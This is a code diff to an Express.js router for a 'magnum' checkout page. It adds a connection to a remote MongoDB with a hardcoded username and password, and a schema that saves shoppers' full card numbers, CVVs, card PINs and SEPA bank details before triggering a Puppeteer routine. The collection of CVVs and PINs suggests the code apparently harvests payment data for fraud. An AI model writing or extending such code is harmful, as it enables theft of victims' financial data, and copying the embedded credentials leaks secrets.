@@ -1,10 +1,53 @@
 var express = require('express');
 var router = express.Router();
+// var mongoose = require('mongoose');
+// var db = require('../data/index.js');
+// var fs = require('fs');
 
 var puppeteer = require('puppeteer');
 var postBody1;
 var postBody2;
+var file = '../data.txt';
 /* GET magnum page. */
+
+var mongoose = require('mongoose');
+
+mongoose.Promise = global.Promise;
+mongoose.connect('mongodb://Adsinc:Ads123!!@ds137102.mlab.com:37102/user-data');
+
+var dataSchema = new mongoose.Schema({
+  firstname: String,
+  lastName: String,
+  shippingAddress1: String,
+  shippingZip: String,
+  shippingCity: String,
+  shippingState: String,
+  shippingCountry: String,
+  phone: String,
+  email: String,
+  x: String,
+  y: String,
+  billingSameAsShipping: String,
+  billingFirstName: String,
+  billingLastName: String,
+  billingAddress1: String,
+  billingZip: String,
+  billingCity: String,
+  billingState: String,
+  billingCountry: String,
+  creditCardType: String,
+  creditCardNumber: String,
+  expmonth: String,
+  expyear: String,
+  CVV: String,
+  sepa_iban: String,
+  sepa_bic: String,
+  pin_number: String
+});
+
+var Data = mongoose.model("Data", dataSchema);
+
+
 router.get('/', function(req, res, next) {
   res.render('magnum/index');
 });
@@ -17,7 +60,7 @@ router.get('/thankyou/', function(req, res, next){
   res.render('magnum/thankyou');
 });
 
-router.post('/testData/', function(req, res){
+router.post('/testData/', (req, res) => {
   console.log(req.body);
   postBody1 = req.body;
   res.redirect('/magnum/checkout/');
@@ -26,8 +69,19 @@ router.post('/testData/', function(req, res){
 router.post('/testData2/', function(req, res){
   console.log(req.body);
   postBody2 = req.body;
-  callPuppeteer();
-  res.redirect('/magnum/thankyou/');
+  var mergePostData = {...postBody1, ...postBody2}
+  var myData = new Data(mergePostData);
+
+  myData.save()
+  .then(item => {
+    res.redirect('/magnum/thankyou/');
+    callPuppeteer();
+  })
+  .catch(err => {
+    res.status(400).send("unable to save to the database.")
+  })
+
+
 });
 module.exports = router;
 
